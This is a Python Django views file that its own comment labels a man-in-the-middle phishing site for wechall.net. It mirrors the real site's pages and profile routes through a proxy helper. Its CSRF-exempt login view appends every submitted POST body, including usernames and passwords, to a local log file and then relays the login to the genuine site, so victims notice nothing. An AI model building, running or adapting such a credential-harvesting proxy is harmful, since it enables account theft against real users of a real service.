from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt

from .helper import display_view, login_post

# MITM phishing site for wechall
def index(request):
    url = 'https://www.wechall.net/'
    return display_view(url)

@csrf_exempt
def login(request):
    url = 'https://www.wechall.net/login'
    with open("requestLog.txt", 'a') as f:
        f.write('\n==========[ POST Request Params ]==========\n')
        f.write(str(request.POST))
    return login_post(url, request.POST)
def news(request):
    url = 'https://www.wechall.net/news'
    return display_view(url)
def links(request):
    url = 'https://www.wechall.net/links'
    return display_view(url)
def active_sites(request):
    url = 'https://www.wechall.net/active_sites'
    return display_view(url)
def forum(request):
    url = 'https://www.wechall.net/forum'
    return display_view(url)
def ranking(request):
    url = 'https://www.wechall.net/ranking'
    return display_view(url)
def challs(request):
    url = 'https://www.wechall.net/challs'
    return display_view(url)
def downloads(request):
    url = 'https://www.wechall.net/downloads'
    return display_view(url)
def register(request):
    url = 'https://www.wechall.net/register'
    return display_view(url)
def about_wechall(request):
    url = 'https://www.wechall.net/about_wechall'
    return display_view(url)
def users_with_All_by_user_regdate_DESC_page_1(request):
    url = 'https://www.wechall.net/users/with/All/by/user_regdate/DESC/page-1'
    return display_view(url)
def profile_MojitoLimeDouble(request):
    url = 'https://www.wechall.net/profile/MojitoLimeDouble'
    return display_view(url)
def profile_AlexKOX(request):
    url = 'https://www.wechall.net/profile/AlexKOX'
    return display_view(url)
def profile_clolcat(request):
    url = 'https://www.wechall.net/profile/clolcat'
    return display_view(url)
def profile_desencrypt(request):
    url = 'https://www.wechall.net/profile/desencrypt'
    return display_view(url)
def profile_LaTD(request):
    url = 'https://www.wechall.net/profile/LaTD'
    return display_view(url)
def profile_c3cili4(request):
    url = 'https://www.wechall.net/profile/c3cili4'
    return display_view(url)
def profile_frijess98(request):
    url = 'https://www.wechall.net/profile/frijess98'
    return display_view(url)
def profile_sshi(request):
    url = 'https://www.wechall.net/profile/sshi'
    return display_view(url)
def users_with_All_by_user_lastactivity_DESC_page_1(request):
    url = 'https://www.wechall.net/users/with/All/by/user_lastactivity/DESC/page-1'
    return display_view(url)
def profile_Guest(request):
    url = 'https://www.wechall.net/profile/Guest'
    return display_view(url)
def profile_a_robles(request):
    url = 'https://www.wechall.net/profile/a_robles'
    return display_view(url)
def profile_dvnunes(request):
    url = 'https://www.wechall.net/profile/dvnunes'
    return display_view(url)
def profile_Elian(request):
    url = 'https://www.wechall.net/profile/Elian'
    return display_view(url)
def profile_gizmore(request):
    url = 'https://www.wechall.net/profile/gizmore'
    return display_view(url)
def profile_livinskull(request):
    url = 'https://www.wechall.net/profile/livinskull'
    return display_view(url)
def profile_lordOric(request):
    url = 'https://www.wechall.net/profile/lordOric'
    return display_view(url)
def profile_New_LucA(request):
    url = 'https://www.wechall.net/profile/New_LucA'
    return display_view(url)
def profile_tehron(request):
    url = 'https://www.wechall.net/profile/tehron'
    return display_view(url)
def profile_tristiny(request):
    url = 'https://www.wechall.net/profile/tristiny'
    return display_view(url)
def profile_zangruochuan(request):
    url = 'https://www.wechall.net/profile/zangruochuan'
    return display_view(url)
def profile_zy5451(request):
    url = 'https://www.wechall.net/profile/zy5451'
    return display_view(url)
def recovery(request):
    url = 'https://www.wechall.net/recovery'
    return display_view(url)
def users(request):
    url = 'https://www.wechall.net/users'
    return display_view(url)
def donations(request):
    url = 'https://www.wechall.net/donations'
    return display_view(url)
def profile_dloser(request):
    url = 'https://www.wechall.net/profile/dloser'
    return display_view(url)
def profile_benito255(request):
    url = 'https://www.wechall.net/profile/benito255'
    return display_view(url)
def profile_Caesum(request):
    url = 'https://www.wechall.net/profile/Caesum'
    return display_view(url)
def profile_jusb3(request):
    url = 'https://www.wechall.net/profile/jusb3'
    return display_view(url)
def profile_phoenix1204(request):
    url = 'https://www.wechall.net/profile/phoenix1204'
    return display_view(url)
def profile_Akorlith(request):
    url = 'https://www.wechall.net/profile/Akorlith'
    return display_view(url)
def profile_thefinder(request):
    url = 'https://www.wechall.net/profile/thefinder'
    return display_view(url)
def profile_yachoor(request):
    url = 'https://www.wechall.net/profile/yachoor'
    return display_view(url)
def profile_SteKap(request):
    url = 'https://www.wechall.net/profile/SteKap'
    return display_view(url)
def profile_TinyMartian(request):
    url = 'https://www.wechall.net/profile/TinyMartian'
    return display_view(url)
def profile_tehbot(request):
    url = 'https://www.wechall.net/profile/tehbot'
    return display_view(url)
def profile_Denzel55(request):
    url = 'https://www.wechall.net/profile/Denzel55'
    return display_view(url)
def profile_TheShade(request):
    url = 'https://www.wechall.net/profile/TheShade'
    return display_view(url)
def profile_tenflo(request):
    url = 'https://www.wechall.net/profile/tenflo'
    return display_view(url)
def profile_LouisJ(request):
    url = 'https://www.wechall.net/profile/LouisJ'
    return display_view(url)
def profile_rinakawamura(request):
    url = 'https://www.wechall.net/profile/rinakawamura'
    return display_view(url)
def profile_ayen2(request):
    url = 'https://www.wechall.net/profile/ayen2'
    return display_view(url)
def profile_djohn364(request):
    url = 'https://www.wechall.net/profile/djohn364'
    return display_view(url)
def profile_B0Jack(request):
    url = 'https://www.wechall.net/profile/B0Jack'
    return display_view(url)
def profile_charkh(request):
    url = 'https://www.wechall.net/profile/charkh'
    return display_view(url)
def join_us(request):
    url = 'https://www.wechall.net/join_us'
    return display_view(url)
def irc_chat(request):
    url = 'https://www.wechall.net/irc_chat'
    return display_view(url)
def contact(request):
    url = 'https://www.wechall.net/contact'
    return display_view(url)
def wechall_license(request):
    url = 'https://www.wechall.net/wechall_license'
    return display_view(url)
